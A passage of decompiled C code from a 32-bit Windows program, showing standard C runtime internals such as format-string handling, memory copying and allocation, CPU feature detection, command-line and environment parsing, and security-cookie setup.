                    puVar16 = (uint *)((int)puVar16 + 2)) {
                }
                local_224 = (uint *)((int)puVar16 - (int)local_220 >> 1);
              }
              goto LAB_00412e95;
            }
            if (bVar11 == 0x75) goto LAB_00412b60;
            if (bVar11 != 0x78) goto LAB_00412e95;
            local_260 = 0x27;
LAB_00412ce8:
            local_224 = (uint *)0x10;
            if ((local_214 & 0x80) != 0) {
              local_22f = (char)local_260 + 'Q';
              local_230 = 0x30;
              local_234 = 2;
            }
            goto LAB_00412b6a;
          }
          if (bVar11 == 0x70) {
            local_21c = (uint *)0x8;
LAB_00412cbc:
            local_260 = 7;
            goto LAB_00412ce8;
          }
          if ((char)bVar11 < 'e') goto LAB_00412e95;
          if ((char)bVar11 < 'h') goto LAB_00412919;
          if (bVar11 == 0x69) goto LAB_00412b59;
          if (bVar11 != 0x6e) {
            if (bVar11 != 0x6f) goto LAB_00412e95;
            local_224 = (uint *)0x8;
            if ((local_214 & 0x80) != 0) {
              local_214 = local_214 | 0x200;
            }
            goto LAB_00412b6a;
          }
          puVar14 = *param_4;
          local_228 = param_4 + 1;
          bVar17 = FUN_00415b32();
          if (CONCAT31(extraout_var,bVar17) == 0) goto switchD_0041266d_caseD_9;
          if ((local_214 & 0x20) == 0) {
            *puVar14 = local_22c;
          }
          else {
            *(WCHAR *)puVar14 = (WCHAR)local_22c;
          }
          local_25c = 1;
          uVar6 = extraout_EDX_03;
        }
        if (local_258 != (uint *)0x0) {
          FUN_0040b61e();
          local_258 = (uint *)0x0;
          uVar6 = extraout_EDX_07;
        }
        break;
      default:
        goto switchD_0041266d_caseD_9;
      case 0xbad1abe1:
        break;
      }
      local_215 = *local_240;
      if (local_215 == 0) break;
      uVar6 = CONCAT31((int3)(uVar6 >> 8),local_215);
      param_2 = local_240;
      param_4 = local_228;
    }
    if ((local_244 == 0) || (local_244 == 7)) goto LAB_00413061;
    puVar5 = (undefined4 *)FUN_0040caaa();
    *puVar5 = 0x16;
  }
  FUN_0040ca42();
  uVar6 = extraout_EDX_00;
  if (local_248 != '\0') {
    *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
  }
LAB_0041307a:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,uVar6);
  return;
}



void __cdecl
FUN_004130ab(undefined (**param_1) [16],LCID param_2,DWORD param_3,LPCWSTR param_4,int param_5,
            LPWSTR param_6,int param_7)

{
  LPCWSTR pWVar1;
  int iVar2;
  undefined local_14 [8];
  int local_c;
  char local_8;
  
  FUN_0040b970(local_14,param_1);
  pWVar1 = param_4;
  iVar2 = param_5;
  if (0 < param_5) {
    do {
      iVar2 = iVar2 + -1;
      if (*pWVar1 == L'\0') goto LAB_004130da;
      pWVar1 = pWVar1 + 1;
    } while (iVar2 != 0);
    iVar2 = -1;
LAB_004130da:
    param_5 = (param_5 - iVar2) + -1;
  }
  LCMapStringW(param_2,param_3,param_4,param_5,param_6,param_7);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

uint __alloca_probe_16(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



// WARNING: This is an inlined function
// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

uint __alloca_probe_8(undefined1 param_1)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



uint __cdecl FUN_0041313c(uint param_1,undefined (**param_2) [16])

{
  ushort uVar1;
  uint uVar2;
  undefined2 extraout_var;
  int iVar3;
  undefined (*local_18 [2]) [16];
  int local_10;
  char local_c;
  WCHAR local_8 [2];
  
  if ((WCHAR)param_1 == -1) {
    return 0xffff;
  }
  FUN_0040b970(local_18,param_2);
  if (*(LCID *)(local_18[0][1] + 4) == 0) {
    if ((ushort)((WCHAR)param_1 + L'﾿') < 0x1a) {
      param_1 = param_1 + 0x20;
    }
  }
  else {
    if (0xff < (ushort)(WCHAR)param_1) {
      iVar3 = FUN_004130ab(local_18,*(LCID *)(local_18[0][1] + 4),0x100,(LPCWSTR)&param_1,1,local_8,
                           1);
      uVar2 = param_1 & 0xffff;
      if (iVar3 != 0) {
        uVar2 = (uint)(ushort)local_8[0];
      }
      goto LAB_004131e2;
    }
    uVar1 = FUN_004122cc((WCHAR)param_1,1,local_18);
    uVar2 = param_1 & 0xffff;
    if (CONCAT22(extraout_var,uVar1) == 0) goto LAB_004131e2;
    param_1 = (uint)*(byte *)(*(int *)(local_18[0][0xc] + 0xc) + uVar2);
  }
  uVar2 = param_1 & 0xffff;
LAB_004131e2:
  if (local_c != '\0') {
    *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined (*) [16] FUN_004131f1(void)

{
  undefined4 *puVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined (*pauVar5) [16];
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420640,0xc);
  uVar4 = *(uint *)(unaff_EBP + 8);
  if ((uVar4 == 0) || (*(uint *)(unaff_EBP + 0xc) <= 0xffffffe0 / uVar4)) {
    uVar4 = uVar4 * *(int *)(unaff_EBP + 0xc);
    *(uint *)(unaff_EBP + 8) = uVar4;
    if (uVar4 == 0) {
      uVar4 = 1;
    }
    do {
      pauVar5 = (undefined (*) [16])0x0;
      *(undefined4 *)(unaff_EBP + -0x1c) = 0;
      if (uVar4 < 0xffffffe1) {
        if (DAT_00425790 == 3) {
          uVar4 = uVar4 + 0xf & 0xfffffff0;
          *(uint *)(unaff_EBP + 0xc) = uVar4;
          if (DAT_0042579c < *(uint *)(unaff_EBP + 8)) goto LAB_004132a2;
          FUN_0040e055(4);
          *(undefined4 *)(unaff_EBP + -4) = 0;
          piVar2 = FUN_0040e867(*(uint **)(unaff_EBP + 8));
          *(int **)(unaff_EBP + -0x1c) = piVar2;
          *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
          FUN_004132ed();
          pauVar5 = *(undefined (**) [16])(unaff_EBP + -0x1c);
          if (pauVar5 != (undefined (*) [16])0x0) {
            FUN_0040f8c0(pauVar5,0,*(uint *)(unaff_EBP + 8));
            goto LAB_004132a2;
          }
        }
        else {
LAB_004132a2:
          if (pauVar5 != (undefined (*) [16])0x0) {
            return pauVar5;
          }
        }
        pauVar5 = (undefined (*) [16])HeapAlloc(DAT_00423e74,8,uVar4);
      }
      if (pauVar5 != (undefined (*) [16])0x0) {
        return pauVar5;
      }
      if (DAT_004241c8 == 0) {
        if (*(undefined4 **)(unaff_EBP + 0x10) == (undefined4 *)0x0) {
          return (undefined (*) [16])0x0;
        }
        **(undefined4 **)(unaff_EBP + 0x10) = 0xc;
        return (undefined (*) [16])0x0;
      }
      iVar3 = FUN_0040f0a7(uVar4);
    } while (iVar3 != 0);
    if (*(undefined4 **)(unaff_EBP + 0x10) != (undefined4 *)0x0) {
      **(undefined4 **)(unaff_EBP + 0x10) = 0xc;
    }
  }
  else {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0xc;
    FUN_0040ca42();
  }
  return (undefined (*) [16])0x0;
}



void FUN_004132ed(void)

{
  FUN_0040df7b(4);
  return;
}



void __cdecl FUN_0041330f(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  uint uVar16;
  
  uVar16 = param_3 >> 7;
  do {
    uVar1 = param_2[1];
    uVar2 = param_2[2];
    uVar3 = param_2[3];
    uVar4 = param_2[4];
    uVar5 = param_2[5];
    uVar6 = param_2[6];
    uVar7 = param_2[7];
    uVar8 = param_2[8];
    uVar9 = param_2[9];
    uVar10 = param_2[10];
    uVar11 = param_2[0xb];
    uVar12 = param_2[0xc];
    uVar13 = param_2[0xd];
    uVar14 = param_2[0xe];
    uVar15 = param_2[0xf];
    *param_1 = *param_2;
    param_1[1] = uVar1;
    param_1[2] = uVar2;
    param_1[3] = uVar3;
    param_1[4] = uVar4;
    param_1[5] = uVar5;
    param_1[6] = uVar6;
    param_1[7] = uVar7;
    param_1[8] = uVar8;
    param_1[9] = uVar9;
    param_1[10] = uVar10;
    param_1[0xb] = uVar11;
    param_1[0xc] = uVar12;
    param_1[0xd] = uVar13;
    param_1[0xe] = uVar14;
    param_1[0xf] = uVar15;
    uVar1 = param_2[0x11];
    uVar2 = param_2[0x12];
    uVar3 = param_2[0x13];
    uVar4 = param_2[0x14];
    uVar5 = param_2[0x15];
    uVar6 = param_2[0x16];
    uVar7 = param_2[0x17];
    uVar8 = param_2[0x18];
    uVar9 = param_2[0x19];
    uVar10 = param_2[0x1a];
    uVar11 = param_2[0x1b];
    uVar12 = param_2[0x1c];
    uVar13 = param_2[0x1d];
    uVar14 = param_2[0x1e];
    uVar15 = param_2[0x1f];
    param_1[0x10] = param_2[0x10];
    param_1[0x11] = uVar1;
    param_1[0x12] = uVar2;
    param_1[0x13] = uVar3;
    param_1[0x14] = uVar4;
    param_1[0x15] = uVar5;
    param_1[0x16] = uVar6;
    param_1[0x17] = uVar7;
    param_1[0x18] = uVar8;
    param_1[0x19] = uVar9;
    param_1[0x1a] = uVar10;
    param_1[0x1b] = uVar11;
    param_1[0x1c] = uVar12;
    param_1[0x1d] = uVar13;
    param_1[0x1e] = uVar14;
    param_1[0x1f] = uVar15;
    param_2 = param_2 + 0x20;
    param_1 = param_1 + 0x20;
    uVar16 = uVar16 - 1;
  } while (uVar16 != 0);
  return;
}



undefined4 * __cdecl FUN_00413396(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined *puVar5;
  undefined4 *puVar6;
  undefined *puVar7;
  undefined4 *puVar8;
  
  uVar3 = (int)param_2 >> 0x1f;
  uVar3 = (((uint)param_2 ^ uVar3) - uVar3 & 0xf ^ uVar3) - uVar3;
  uVar4 = (int)param_1 >> 0x1f;
  uVar4 = (((uint)param_1 ^ uVar4) - uVar4 & 0xf ^ uVar4) - uVar4;
  if ((uVar3 | uVar4) == 0) {
    uVar3 = param_3 & 0x7f;
    if (param_3 != uVar3) {
      FUN_0041330f(param_1,param_2,param_3 - uVar3);
    }
    if (uVar3 != 0) {
      puVar5 = (undefined *)((int)param_2 + (param_3 - uVar3));
      puVar7 = (undefined *)((int)param_1 + (param_3 - uVar3));
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar7 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar7 = puVar7 + 1;
      }
    }
  }
  else if (uVar3 == uVar4) {
    iVar1 = 0x10 - uVar3;
    puVar6 = param_2;
    puVar8 = param_1;
    for (iVar2 = iVar1; iVar2 != 0; iVar2 = iVar2 + -1) {
      *(undefined *)puVar8 = *(undefined *)puVar6;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
      puVar8 = (undefined4 *)((int)puVar8 + 1);
    }
    FUN_00413396((undefined4 *)((int)param_1 + iVar1),(undefined4 *)((int)param_2 + iVar1),
                 param_3 - iVar1);
  }
  else {
    puVar6 = param_1;
    for (uVar3 = param_3 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar6 = *param_2;
      param_2 = param_2 + 1;
      puVar6 = puVar6 + 1;
    }
    for (uVar3 = param_3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar6 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    }
  }
  return param_1;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_00413479(void)

{
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420660,0xc);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  *(undefined4 *)(unaff_EBP + -0x1c) = 1;
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  return *(undefined4 *)(unaff_EBP + -0x1c);
}



// WARNING: Removing unreachable block (ram,0x00413506)
// WARNING: Removing unreachable block (ram,0x004134f3)

undefined4 FUN_004134c9(void)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  uVar4 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | 0x40
          | (uint)(in_AF & 1) * 0x10 | 4 | (uint)(in_ID & 1) * 0x200000 |
          (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000
  ;
  uVar1 = uVar4 ^ 0x200000;
  if (((uint)((uVar1 & 0x4000) != 0) * 0x4000 | (uint)((uVar1 & 0x400) != 0) * 0x400 |
       (uint)((uVar1 & 0x200) != 0) * 0x200 | (uint)((uVar1 & 0x100) != 0) * 0x100 |
       (uint)((uVar1 & 0x40) != 0) * 0x40 | (uint)((uVar1 & 0x10) != 0) * 0x10 |
       (uint)((uVar1 & 4) != 0) * 4 | (uint)((uVar1 & 0x200000) != 0) * 0x200000 |
      (uint)((uVar1 & 0x40000) != 0) * 0x40000) != uVar4) {
    cpuid_basic_info(0);
    iVar2 = cpuid_Version_info(1);
    local_8 = *(uint *)(iVar2 + 8);
  }
  if (((local_8 & 0x4000000) == 0) || (iVar2 = FUN_00413479(), iVar2 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = 1;
  }
  return uVar3;
}



undefined4 FUN_00413538(int **param_1)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = *param_1;
  if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&
     ((iVar2 = piVar1[5], iVar2 == 0x19930520 ||
      (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {
    FUN_00414e48();
  }
  return 0;
}



undefined (*) [16] __cdecl FUN_00413588(int param_1,undefined4 param_2)

{
  int *piVar1;
  code *pcVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined (*pauVar5) [16];
  int *piVar6;
  int iVar7;
  int iVar8;
  
  pauVar5 = FUN_0040cd41();
  if (pauVar5 != (undefined (*) [16])0x0) {
    piVar1 = *(int **)(pauVar5[5] + 0xc);
    piVar6 = piVar1;
    do {
      if (*piVar6 == param_1) break;
      piVar6 = piVar6 + 3;
    } while (piVar6 < piVar1 + DAT_00422dcc * 3);
    if ((piVar1 + DAT_00422dcc * 3 <= piVar6) || (*piVar6 != param_1)) {
      piVar6 = (int *)0x0;
    }
    if ((piVar6 == (int *)0x0) || (pcVar2 = (code *)piVar6[2], pcVar2 == (code *)0x0)) {
      pauVar5 = (undefined (*) [16])0x0;
    }
    else if (pcVar2 == (code *)0x5) {
      piVar6[2] = 0;
      pauVar5 = (undefined (*) [16])0x1;
    }
    else {
      if (pcVar2 != (code *)0x1) {
        uVar3 = *(undefined4 *)pauVar5[6];
        *(undefined4 *)pauVar5[6] = param_2;
        if (piVar6[1] == 8) {
          if (DAT_00422dc0 < DAT_00422dc4 + DAT_00422dc0) {
            iVar7 = DAT_00422dc0 * 0xc;
            iVar8 = DAT_00422dc0;
            do {
              *(undefined4 *)(iVar7 + 8 + *(int *)(pauVar5[5] + 0xc)) = 0;
              iVar8 = iVar8 + 1;
              iVar7 = iVar7 + 0xc;
            } while (iVar8 < DAT_00422dc4 + DAT_00422dc0);
          }
          iVar8 = *piVar6;
          uVar4 = *(undefined4 *)(pauVar5[6] + 4);
          if (iVar8 == -0x3fffff72) {
            *(undefined4 *)(pauVar5[6] + 4) = 0x83;
          }
          else if (iVar8 == -0x3fffff70) {
            *(undefined4 *)(pauVar5[6] + 4) = 0x81;
          }
          else if (iVar8 == -0x3fffff6f) {
            *(undefined4 *)(pauVar5[6] + 4) = 0x84;
          }
          else if (iVar8 == -0x3fffff6d) {
            *(undefined4 *)(pauVar5[6] + 4) = 0x85;
          }
          else if (iVar8 == -0x3fffff73) {
            *(undefined4 *)(pauVar5[6] + 4) = 0x82;
          }
          else if (iVar8 == -0x3fffff71) {
            *(undefined4 *)(pauVar5[6] + 4) = 0x86;
          }
          else if (iVar8 == -0x3fffff6e) {
            *(undefined4 *)(pauVar5[6] + 4) = 0x8a;
          }
          (*pcVar2)(8,*(undefined4 *)(pauVar5[6] + 4));
          *(undefined4 *)(pauVar5[6] + 4) = uVar4;
        }
        else {
          piVar6[2] = 0;
          (*pcVar2)(piVar6[1]);
        }
        *(undefined4 *)pauVar5[6] = uVar3;
      }
      pauVar5 = (undefined (*) [16])0xffffffff;
    }
  }
  return pauVar5;
}



void FUN_004136e8(void)

{
  ushort uVar1;
  bool bVar2;
  ushort *puVar3;
  
  bVar2 = false;
  puVar3 = DAT_004268e4;
  if (DAT_004268e4 == (ushort *)0x0) {
    puVar3 = &DAT_0041de30;
  }
  do {
    uVar1 = *puVar3;
    if (uVar1 < 0x21) {
      if (uVar1 == 0) {
        return;
      }
      if (!bVar2) {
        for (; (*puVar3 != 0 && (*puVar3 < 0x21)); puVar3 = puVar3 + 1) {
        }
        return;
      }
    }
    if (uVar1 == 0x22) {
      bVar2 = !bVar2;
    }
    puVar3 = puVar3 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0041372e(void)

{
  undefined4 uVar1;
  undefined (*pauVar2) [16];
  undefined (*pauVar3) [16];
  int iVar4;
  short *psVar5;
  int iVar6;
  
  iVar6 = 0;
  psVar5 = DAT_004239d4;
  if (DAT_004239d4 == (short *)0x0) {
    uVar1 = 0xffffffff;
  }
  else {
    for (; *psVar5 != 0; psVar5 = psVar5 + iVar4 + 1) {
      if (*psVar5 != 0x3d) {
        iVar6 = iVar6 + 1;
      }
      iVar4 = FUN_004169f1(psVar5);
    }
    pauVar2 = FUN_00413b97(iVar6 + 1,4);
    psVar5 = DAT_004239d4;
    DAT_00423e90 = pauVar2;
    if (pauVar2 == (undefined (*) [16])0x0) {
      uVar1 = 0xffffffff;
    }
    else {
      for (; *psVar5 != 0; psVar5 = psVar5 + iVar6) {
        iVar6 = FUN_004169f1(psVar5);
        iVar6 = iVar6 + 1;
        if (*psVar5 != 0x3d) {
          pauVar3 = FUN_00413b97(iVar6,2);
          *(undefined (**) [16])*pauVar2 = pauVar3;
          if (pauVar3 == (undefined (*) [16])0x0) {
            FUN_0040b61e();
            DAT_00423e90 = (undefined (*) [16])0x0;
            return 0xffffffff;
          }
          iVar4 = FUN_0040aa6e((short *)pauVar3,iVar6,psVar5);
          if (iVar4 != 0) {
            FUN_0040c91a();
          }
          pauVar2 = (undefined (*) [16])(*pauVar2 + 4);
        }
      }
      FUN_0040b61e();
      DAT_004239d4 = (short *)0x0;
      *(undefined4 *)*pauVar2 = 0;
      _DAT_0042577c = 1;
      uVar1 = 0;
    }
  }
  return uVar1;
}



void __thiscall FUN_0041380c(void *this,short **param_1,int *param_2)

{
  bool bVar1;
  bool bVar2;
  short *in_EAX;
  short *psVar3;
  short sVar4;
  uint uVar5;
  int *unaff_EBX;
  
  bVar1 = false;
  *unaff_EBX = 0;
  *param_2 = 1;
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)this;
    param_1 = param_1 + 1;
  }
  do {
    if (*in_EAX == 0x22) {
      bVar1 = !bVar1;
      sVar4 = 0x22;
    }
    else {
      *unaff_EBX = *unaff_EBX + 1;
      if ((short *)this != (short *)0x0) {
        *(short *)this = *in_EAX;
        this = (void *)((int)this + 2);
      }
      sVar4 = *in_EAX;
      if (sVar4 == 0) goto LAB_0041387c;
    }
    in_EAX = in_EAX + 1;
  } while ((bVar1) || ((sVar4 != 0x20 && (sVar4 != 9))));
  if ((short *)this != (short *)0x0) {
    *(short *)((int)this + -2) = 0;
  }
LAB_0041387c:
  bVar1 = false;
  while (psVar3 = in_EAX, *in_EAX != 0) {
    for (; (*psVar3 == 0x20 || (*psVar3 == 9)); psVar3 = psVar3 + 1) {
    }
    if (*psVar3 == 0) break;
    if (param_1 != (short **)0x0) {
      *param_1 = (short *)this;
      param_1 = param_1 + 1;
    }
    *param_2 = *param_2 + 1;
    while( true ) {
      bVar2 = true;
      uVar5 = 0;
      for (; *psVar3 == 0x5c; psVar3 = psVar3 + 1) {
        uVar5 = uVar5 + 1;
      }
      in_EAX = psVar3;
      if (*psVar3 == 0x22) {
        if (((uVar5 & 1) == 0) && ((!bVar1 || (in_EAX = psVar3 + 1, *in_EAX != 0x22)))) {
          bVar2 = false;
          bVar1 = !bVar1;
          in_EAX = psVar3;
        }
        uVar5 = uVar5 >> 1;
      }
      while (uVar5 != 0) {
        uVar5 = uVar5 - 1;
        if ((short *)this != (short *)0x0) {
          *(short *)this = 0x5c;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      sVar4 = *in_EAX;
      if ((sVar4 == 0) || ((!bVar1 && ((sVar4 == 0x20 || (sVar4 == 9)))))) break;
      if (bVar2) {
        if ((short *)this != (short *)0x0) {
          *(short *)this = sVar4;
          this = (void *)((int)this + 2);
        }
        *unaff_EBX = *unaff_EBX + 1;
      }
      psVar3 = in_EAX + 1;
    }
    if ((short *)this != (short *)0x0) {
      *(short *)this = 0;
      this = (void *)((int)this + 2);
    }
    *unaff_EBX = *unaff_EBX + 1;
  }
  if (param_1 != (short **)0x0) {
    *param_1 = (short *)0x0;
  }
  *param_2 = *param_2 + 1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __fastcall FUN_0041395d(uint param_1)

{
  uint uVar1;
  uint uVar2;
  short **ppsVar3;
  undefined4 uVar4;
  uint local_8;
  
  _DAT_00424418 = 0;
  local_8 = param_1;
  GetModuleFileNameW((HMODULE)0x0,(LPWSTR)&DAT_00424210,0x104);
  _DAT_00423e9c = &DAT_00424210;
  FUN_0041380c((void *)0x0,(short **)0x0,(int *)&local_8);
  uVar2 = local_8;
  if ((((local_8 < 0x3fffffff) && (param_1 < 0x7fffffff)) &&
      (uVar1 = (param_1 + local_8 * 2) * 2, param_1 * 2 <= uVar1)) &&
     (ppsVar3 = (short **)FUN_00413b52(uVar1), ppsVar3 != (short **)0x0)) {
    FUN_0041380c(ppsVar3 + uVar2,ppsVar3,(int *)&local_8);
    _DAT_00423e7c = local_8 - 1;
    uVar4 = 0;
    _DAT_00423e84 = ppsVar3;
  }
  else {
    uVar4 = 0xffffffff;
  }
  return uVar4;
}



undefined4 * FUN_00413a0b(void)

{
  short sVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  uint uVar5;
  
  puVar2 = (undefined4 *)GetEnvironmentStringsW();
  if (puVar2 != (undefined4 *)0x0) {
    sVar1 = *(short *)puVar2;
    puVar4 = puVar2;
    while (sVar1 != 0) {
      do {
        puVar3 = puVar4;
        puVar4 = (undefined4 *)((int)puVar3 + 2);
      } while (*(short *)puVar4 != 0);
      puVar4 = puVar3 + 1;
      sVar1 = *(short *)puVar4;
    }
    uVar5 = (int)puVar4 + (2 - (int)puVar2);
    puVar4 = (undefined4 *)FUN_00413b52(uVar5);
    if (puVar4 != (undefined4 *)0x0) {
      FUN_00410450(puVar4,puVar2,uVar5);
    }
    FreeEnvironmentStringsW((LPWCH)puVar2);
    return puVar4;
  }
  return (undefined4 *)0x0;
}



LPWSTR GetCommandLineW(void)

{
  LPWSTR pWVar1;
  
                    // WARNING: Could not recover jumptable at 0x00413a62. Too many branches
                    // WARNING: Treating indirect jump as call
  pWVar1 = GetCommandLineW();
  return pWVar1;
}



// WARNING: Removing unreachable block (ram,0x00413a7c)
// WARNING: Removing unreachable block (ram,0x00413a82)
// WARNING: Removing unreachable block (ram,0x00413a84)

void FUN_00413a68(void)

{
  return;
}



void FUN_00413ab4(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_00422044 == 0xbb40e64e) || ((DAT_00422044 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_00422044 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_00422044 == 0xbb40e64e) {
      DAT_00422044 = 0xbb40e64f;
    }
    else if ((DAT_00422044 & 0xffff0000) == 0) {
      DAT_00422044 = DAT_00422044 | DAT_00422044 << 0x10;
    }
    DAT_00422048 = ~DAT_00422044;
  }
  else {
    DAT_00422048 = ~DAT_00422044;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00413b4a(void)

{
  _DAT_00425774 = 0;
  return;
}



LPVOID __cdecl FUN_00413b52(uint param_1)

{
  LPVOID pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = FUN_0040afc0(param_1);
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (DAT_0042441c == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042441c < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (LPVOID)0x0;
    }
  }
  return (LPVOID)0x0;
}



undefined (*) [16] FUN_00413b97(undefined4 param_1,undefined4 param_2)

{
  undefined (*pauVar1) [16];
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pauVar1 = FUN_004131f1();
    if (pauVar1 != (undefined (*) [16])0x0) {
      return pauVar1;
    }
    if (DAT_0042441c == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042441c < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (undefined (*) [16])0x0;
    }
  }
  return (undefined (*) [16])0x0;
}



LPVOID __cdecl FUN_00413be3(undefined4 param_1,int param_2)

{
  LPVOID pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = FUN_00416a0b();
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (param_2 == 0) {
      return (LPVOID)0x0;
    }
    if (DAT_0042441c == 0) {
      return (LPVOID)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042441c < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (LPVOID)0x0;
}



undefined4 __cdecl
FUN_00413cd0(undefined4 *param_1,LPCWSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  int iVar3;
  uint uVar4;
  undefined4 *puVar5;
  DWORD DVar6;
  int *piVar7;
  int iVar8;
  HANDLE pvVar9;
  byte bVar10;
  bool bVar11;
  longlong lVar12;
  undefined8 uVar13;
  _SECURITY_ATTRIBUTES local_38;
  undefined4 local_28;
  uint local_24;
  HANDLE local_20;
  DWORD local_1c;
  DWORD local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar11 = (param_3 & 0x80) == 0;
  local_24 = 0;
  local_6 = 0;
  local_38.nLength = 0xc;
  local_38.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar11) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_38.bInheritHandle = (BOOL)bVar11;
  iVar3 = FUN_00416e98(&local_24);
  if (iVar3 != 0) {
    FUN_0040c91a();
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_24 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_c = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_c = 0x40000000;
        goto LAB_00413d9d;
      }
    }
    else if (uVar4 != 2) goto LAB_00413d59;
    local_c = 0xc0000000;
  }
LAB_00413d9d:
  if (param_4 == 0x10) {
    local_14 = 0;
  }
  else if (param_4 == 0x20) {
    local_14 = 1;
  }
  else if (param_4 == 0x30) {
    local_14 = 2;
  }
  else if (param_4 == 0x40) {
    local_14 = 3;
  }
  else {
    if (param_4 != 0x80) goto LAB_00413d59;
    local_14 = (uint)(local_c == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_18 = 3;
    }
    else if (uVar4 == 0x100) {
      local_18 = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_00413ea2;
      if (uVar4 != 0x300) goto LAB_00413d59;
